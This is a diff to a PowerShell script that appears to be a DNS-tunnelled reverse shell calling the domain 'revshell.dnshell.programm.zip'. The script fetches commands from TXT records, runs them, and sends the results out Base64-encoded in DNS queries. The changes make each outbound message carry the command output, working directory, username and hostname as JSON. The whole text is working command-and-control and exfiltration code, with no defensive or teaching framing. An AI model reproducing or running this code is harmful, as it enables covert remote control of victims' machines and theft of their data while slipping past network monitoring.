@@ -4,9 +4,11 @@ function Send-Data {
         $code,
         $counter
     )
+
+    $json = $data | ConvertTo-Json
     
     # Encode data as Base64
-    $encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
+    $encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
     
     # Replace padding characters with _ so it can be transmitted over DNS
     $encodedData = $encodedData.Replace("=", "_")
@@ -33,7 +35,12 @@ $domain = "revshell.dnshell.programm.zip"
 $code = (Get-Date).ToString("yyyyMMddHHmmss")
 
 # Send code to DNS server
-Send-Data -data $code -code 0 -counter 0
+Send-Data -data @{
+    code = $code
+    pwd = $PWD.Path
+    user = whoami
+    hostname = hostname
+} -code 0 -counter 0
 
 # Request TXT record from DNS server
 $commandcount = 0
@@ -49,18 +56,24 @@ while (!$stop) {
             $output = ($output | Format-Table | Out-String)
             Write-Host "Send Output with length $($output.Length)"
             if($output.Length -eq 0){
-                $output = "No output from this command"
+                $output = ""
             }
             # Send current PWD
-            Write-Host "Sending current PWD: $($PWD.Path)"
-            Send-Data -data $PWD.Path -code "pwd-$code" -counter $commandcount
             Write-Host "Sending Output"
-            Send-Data -data $output -code $code -counter $commandcount
+            Send-Data -data @{
+                output = $output
+                pwd = $PWD.Path
+                user = whoami
+                hostname = hostname
+            } -code $code -counter $commandcount
         }
         catch {
-            Write-Host "Sending current PWD: $($PWD.Path)"
-            Send-Data -data $PWD.Path -code "pwd-$code" -counter $commandcount
-            Send-Data -data "Error: $_" -code $code -counter $commandcount
+            Send-Data -data @{
+                output = "Error: $_"
+                pwd = $PWD.Path
+                user = whoami
+                hostname = hostname
+            }
         }
         $commandcount++
     }
